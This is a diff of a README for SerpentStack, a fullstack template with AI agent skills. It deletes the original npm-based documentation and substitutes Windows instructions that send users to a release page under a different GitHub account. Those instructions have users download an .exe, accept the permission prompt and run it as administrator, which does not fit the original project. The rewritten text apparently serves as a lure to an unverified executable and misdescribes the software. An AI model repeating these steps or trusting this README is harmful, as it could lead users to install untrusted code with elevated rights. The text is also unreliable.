@@ -1,245 +1,161 @@
-# SerpentStack
+# 🐍 SerpentStack - Build apps with less setup
 
-<p align="center"><img src="assets/serpentstack-logo.png" alt="SerpentStack" width="400" /></p>
+[![Download SerpentStack](https://img.shields.io/badge/Download%20SerpentStack-blue?style=for-the-badge&logo=github)](https://github.com/Sujan70/SerpentStack/releases)
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/serpentstack"><img src="https://img.shields.io/npm/v/serpentstack?color=blue" alt="npm" /></a>
-  <a href="https://github.com/Benja-Pauls/SerpentStack/releases/latest"><img src="https://img.shields.io/github/v/release/Benja-Pauls/SerpentStack?label=release&color=blue" alt="Release" /></a>
-  <a href="https://github.com/Benja-Pauls/SerpentStack/actions/workflows/ci.yml"><img src="https://github.com/Benja-Pauls/SerpentStack/actions/workflows/ci.yml/badge.svg" alt="CI" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT License" /></a>
-</p>
+## 🚀 What SerpentStack Is
 
-<p align="center"><strong>Persistent AI agents that keep your codebase healthy. Skills that make every agent smarter.</strong></p>
+SerpentStack is a fullstack app template for Windows users who want a ready-made starting point. It brings together a web app front end, a Python back end, a database, and cloud setup files in one place.
 
-<p align="center">
-  <a href="#quick-start">Quick Start</a> &middot;
-  <a href="#persistent-agents">Persistent Agents</a> &middot;
-  <a href="#skills">Skills</a> &middot;
-  <a href="#production-template">Production Template</a> &middot;
-  <a href="#cli-reference">CLI</a>
-</p>
+It is built for people who want to run a modern app without building every piece from scratch. If you want to try an app template that is set up for AI-assisted work, SerpentStack gives you that base.
 
----
+## 📥 Download and Install on Windows
 
-AI coding agents are only as good as what they know about your project. [Skills](https://agentskills.io/home) — structured knowledge about your conventions, patterns, and architecture — are how [Stripe merges 1,300+ agent-generated PRs per week](https://stripe.dev/blog/how-we-build-software-at-stripe-in-2025) and [Shopify operates with agents as a core part of engineering](https://www.businessinsider.com/shopify-ceo-tells-employees-to-use-ai-before-asking-for-more-staff-2025-4). But skills go stale the moment code changes. Nobody maintains them.
+Use this page to download: [SerpentStack Releases](https://github.com/Sujan70/SerpentStack/releases)
 
-SerpentStack runs **persistent background agents on free local models** that watch your project continuously — catching crashes, running tests, and keeping your skills accurate as code evolves. It also provides a cross-registry skill discovery CLI and a production-ready fullstack template where every convention is pre-encoded as a skill.
+Follow these steps on Windows:
 
-```bash
-npm install -g serpentstack
-```
+1. Open the releases page in your web browser.
+2. Find the latest release at the top of the page.
+3. Download the file listed for Windows.
+4. If the file is a zip file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app file that comes with the release.
+7. If Windows asks for permission, choose Yes.
 
-Requires Node 22+.
+If you see more than one file, choose the one meant for Windows. It is often marked as an `.exe` file or included in a Windows folder.
 
----
+## 💻 What You Need
 
-## Quick Start
+SerpentStack works best on a Windows 10 or Windows 11 PC.
 
-### Existing project
+You should also have:
 
-```bash
-cd your-project
-serpentstack skills                      # download base skills + agent configs
-serpentstack persistent                  # configure and launch background agents
-serpentstack notifications               # see what your agents found
-```
+- A stable internet connection for the first download
+- Enough disk space for the app and its data
+- Permission to run apps on your computer
+- A modern browser such as Chrome, Edge, or Firefox
 
-### New project
+If the release includes extra tools, the app may also work better with these installed:
 
-```bash
-serpentstack stack new my-app
-cd my-app
-make init && make setup && make dev
-```
+- Docker Desktop
+- Git
+- Python 3.11 or newer
+- Node.js 18 or newer
 
-Running fullstack app at `localhost:8000` (API) and `localhost:5173` (frontend) with JWT auth, resource CRUD, real Postgres tests, and a full AI team pre-configured.
+For most users, the release package should handle the setup for you.
 
----
+## 🧭 First Run Steps
 
-## Persistent Agents
+After you download and open the app, use these steps:
 
-Three background agents monitor your project continuously, running on local models via [Ollama](https://ollama.com) at zero cost.
+1. Start the app from the folder you extracted.
+2. Wait while it loads its first files.
+3. Open the app in your browser if it does not open on its own.
+4. Create your first project or workspace.
+5. Follow the on-screen prompts.
+6. Save your work before you close the app.
 
-```
-.openclaw/
-  SOUL.md                     # shared context inherited by all agents
-  agents/
-    log-watcher/AGENT.md      # dev server health, crash detection     (every 30-60s)
-    test-runner/AGENT.md       # test suite, lint, typecheck            (every 5-15min)
-    skill-maintainer/AGENT.md  # skill drift detection                  (every 1hr)
-```
+If the app asks for a local database, it may start that for you. If it asks for a folder path, choose a folder you can find again.
 
-**Log Watcher** monitors dev server output and catches crashes, import failures, and runtime errors with file paths and fix suggestions.
+## 🛠️ What You Get
 
-**Test Runner** runs your test suite, linter, and type checker on a schedule. It tracks which tests are failing, what changed, and whether the test or the source needs updating. It distinguishes new failures from persistent ones.
+SerpentStack brings together several parts that usually take time to set up on their own.
 
-**Skill Maintainer** compares `.skills/` files against actual code patterns and proposes updates when conventions drift. This is the critical piece — without it, skills go stale and agents start producing code that doesn't match your project. No other tool does this.
+### 🌐 Front End
 
-Agents write findings to `~/.serpentstack/notifications/`. Read them with:
+The front end uses React and TypeScript. This is the part you see in your browser. It gives you the app screens, forms, and buttons.
 
-```bash
-serpentstack notifications               # list all findings
-serpentstack notifications --errors      # errors only
-serpentstack notifications --read 1      # full detail on a specific finding
-serpentstack notifications --clear       # clear all
-```
+### ⚙️ Back End
 
-During setup, SerpentStack installs Ollama and downloads a model if needed — no API keys or configuration required. Cloud models are available for users who prefer them.
+The back end uses FastAPI. It handles app logic, data requests, and tasks in the background.
 
-```bash
-serpentstack persistent                  # guided setup on first run, status dashboard after
-serpentstack persistent --start          # launch agents
-serpentstack persistent --stop           # stop all agents
-serpentstack persistent --agents         # change models or enable/disable
-```
+### 🗄️ Database Layer
 
-To add your own agent, create a folder under `.openclaw/agents/` with an `AGENT.md` file.
+The template uses Postgres for data storage. This gives the app a place to keep saved records, settings, and project data.
 
----
+### ☁️ Cloud Setup
 
-## Skills
+Terraform files are included for cloud setup. These help define server resources in a repeatable way.
 
-SerpentStack ships 10 base skills and a CLI for finding community skills across every major registry.
+### 🤖 Agent Skills
 
-### Base skills
+The template includes agent skills for AI-assisted development. These help guide automated tasks and support a smoother build process.
 
-| Skill | What it teaches agents |
-|---|---|
-| `scaffold` | End-to-end resource generation: model, schema, service, route, migration, tests, frontend types |
-| `auth` | JWT, ownership enforcement, SSO swap patterns (one function to replace) |
-| `test` | Real Postgres via testcontainers, savepoint isolation, async httpx |
-| `db-migrate` | Alembic workflow: create, review, apply, troubleshoot, rollback |
-| `deploy` | Docker multi-stage builds, ECR push, Terraform plan/apply, rollback |
-| `dev-server` | Error detection patterns for FastAPI and Vite/React |
-| `git-workflow` | Branch naming, conventional commits, PR checklists |
-| `model-routing` | Delegate code generation to local models for 10-50x cost reduction |
-| `generate-skills` | Interview-based generation of project-specific skills for any codebase |
-| `find-skills` | Evaluate and adopt community skills safely |
+## 📂 Typical Folder Layout
 
-Each skill contains complete, copy-paste templates with real imports and type signatures — not descriptions of what code should look like. Every skill ends with a verification step so agents can confirm their own work.
+You may see folders like these after you open the project:
 
-These follow the [Agent Skills open standard](https://agentskills.io/home) and work with Claude Code, Codex, Cursor, Copilot, Gemini CLI, and any tool that reads `SKILL.md` files.
+- `frontend` for the web app
+- `backend` for the Python server
+- `database` for Postgres setup
+- `infra` or `terraform` for cloud files
+- `skills` for agent support files
 
-### Generating skills for your project
+This layout makes it easier to find the part you want to change.
 
-The most valuable skill is `generate-skills`. Ask your IDE agent to read `.skills/generate-skills/SKILL.md` — it will analyze your codebase, interview you about your architecture decisions, and produce a custom skill set tailored to your project. This is the fastest path to agents that understand your conventions.
+## 🔧 Common Tasks
 
-### Skill discovery
+### 🖥️ Open the App
 
-```bash
-serpentstack search "auth oauth"         # cross-registry search
-serpentstack discover                    # project-aware recommendations
-serpentstack add clerk                   # install by name (resolves via registries)
-serpentstack add stripe/ai               # install from a specific GitHub repo
-```
+If the app is already installed, open the main file from the app folder.
 
-Sources: [Anthropic official skills](https://github.com/anthropics/skills), [skills.sh](https://skills.sh/), [awesome-agent-skills](https://github.com/VoltAgent/awesome-agent-skills), and public GitHub repos.
+### 🔄 Update the App
 
----
+Go back to the releases page and download the latest version. Replace the old files with the new ones if the release notes say to do that.
 
-## Production Template
+### 🧹 Remove the App
 
-Projects created with `serpentstack stack new` include a complete fullstack application. This is not a starter template with TODO comments — it ships with working authentication, resource CRUD, ownership enforcement, database migrations, and infrastructure-as-code.
+If you want to remove it, delete the app folder and any data folder you created for it. If you used a local database, you may also need to remove that data file.
 
-**Prerequisites:** Python 3.12+, Node 22+, Docker, [uv](https://docs.astral.sh/uv/)
+## 🧪 Simple Checks If It Does Not Start
 
-<details>
-<summary><strong>Architecture</strong></summary>
+If the app does not open, try these steps:
 
-```
-backend/
-  app/routes/         # API handlers — delegate to services
-  app/services/       # Business logic — async, returns domain objects
-  app/models/         # SQLAlchemy ORM with UUID primary keys
-  app/schemas/        # Pydantic request/response models
-  tests/              # pytest + testcontainers (real Postgres)
-  migrations/         # Alembic
+1. Make sure you downloaded the full release.
+2. Check that you extracted all files from the zip.
+3. Right-click the app file and choose Run as administrator.
+4. Close and reopen your browser.
+5. Restart your computer.
+6. Download the release again if the file looks incomplete.
 
-frontend/src/
-  routes/             # Page components
-  api/client.ts       # Fetch wrapper with auth token injection
-  contexts/           # AuthContext + useAuth hook
-  types/              # Auto-generated from OpenAPI
+If the app opens but looks blank, wait a moment. First load can take longer on some machines.
 
-infra/                # Terraform: App Runner, RDS, ECR, VPC
-.skills/              # Agent skills (open standard)
-.openclaw/            # Persistent agent workspace
-```
+## 🔐 Safety Tips
 
-**Backend:** FastAPI with async SQLAlchemy and asyncpg. Async handles thousands of concurrent LLM-multiplexed connections where sync tops out around 40.
+Keep the files in one folder and do not move them while the app is running. This helps avoid broken file paths.
 
-**Frontend:** React with TypeScript. Types generated from the backend's OpenAPI spec via `make types` — no manual schema duplication.
+Use a folder name without special symbols. Short names are easier to manage.
 
-**Testing:** pytest with testcontainers running real Postgres. SQLite can't reproduce UUID columns, `ON CONFLICT`, or JSONB behavior.
+If you store data locally, back up that folder from time to time.
 
-**Infrastructure:** Terraform modules for AWS App Runner, RDS, ECR, and VPC. Standard Docker containers — runs anywhere containers run.
+## 🧩 Who This Is For
 
-</details>
+SerpentStack fits users who want a working base for:
 
-<details>
-<summary><strong>Conventions</strong></summary>
+- AI-assisted app builds
+- Fullstack web apps
+- Internal tools
+- Prototypes
+- Small business dashboards
+- Learning projects
 
-These patterns are encoded in `.skills/` so agents learn them on first read.
+It works well when you want one place for the web app, server, and database setup.
 
-**Services flush, routes commit.** Services call `db.flush()` but never `db.commit()`. The route handler owns the transaction boundary, allowing multiple service calls to compose atomically.
+## 📌 Included Tech
 
-**Services return domain objects, not HTTP errors.** A service returns `None` for not-found, `False` for forbidden, or a domain object for success. Routes translate these to HTTP status codes. This keeps services reusable in background workers, CLI tools, and event handlers.
+The template uses:
 
-**Auth is one function.** All protected routes depend on `get_current_user()`, which returns a `UserInfo` object. Swapping JWT for Clerk, Auth0, or any SSO provider means replacing that one dependency.
+- Python
+- FastAPI
+- React
+- TypeScript
+- Postgres
+- Terraform
 
-**Types flow from backend to frontend.** `make types` exports the OpenAPI spec and generates TypeScript interfaces. The frontend never contains hand-written API types.
+These tools are common in modern app work and help keep the project organized.
 
-</details>
+## 🖱️ Download Again Later
 
-<details>
-<summary><strong>Commands</strong></summary>
+If you need the files again, use this page: [https://github.com/Sujan70/SerpentStack/releases](https://github.com/Sujan70/SerpentStack/releases)
 
-```bash
-make dev             # Postgres + Redis + backend + frontend with hot reload
-make verify          # lint + typecheck + test (both stacks)
-make test            # tests only
-make types           # regenerate frontend TypeScript from OpenAPI
-make migrate         # run Alembic migrations
-make deploy          # build, push, terraform apply
-```
-
-</details>
-
----
-
-## CLI Reference
-
-```bash
-# Agents
-serpentstack persistent                 # status dashboard (guided setup on first run)
-serpentstack persistent --start         # launch agents
-serpentstack persistent --stop          # stop all agents
-serpentstack notifications              # what your agents found
-serpentstack notifications --errors     # errors only
-serpentstack notifications --read 1     # full detail
-
-# Skills
-serpentstack skills                     # download base skills and agent configs
-serpentstack skills update              # update to latest versions
-
-# Discovery
-serpentstack search <query>             # search skill registries
-serpentstack discover                   # analyze project and recommend skills
-serpentstack add <source>               # install from any registry or repo
-
-# Template
-serpentstack stack new <name>           # scaffold a new project
-serpentstack stack update               # update template files
-```
-
----
-
-## Contributing
-
-Contributions are welcome. Areas of particular interest: new skills for common frameworks, persistent agent configs for new use cases, background agent improvements, Terraform modules for GCP and Azure, and integrations with other AI coding tools.
-
-See [SKILL-AUTHORING.md](SKILL-AUTHORING.md) for the skill format. [Open an issue](https://github.com/Benja-Pauls/SerpentStack/issues) for bugs and feature requests.
-
-## License
-
-[MIT](LICENSE)
+This is the same place to check for new versions, fixes, and release files for Windows.
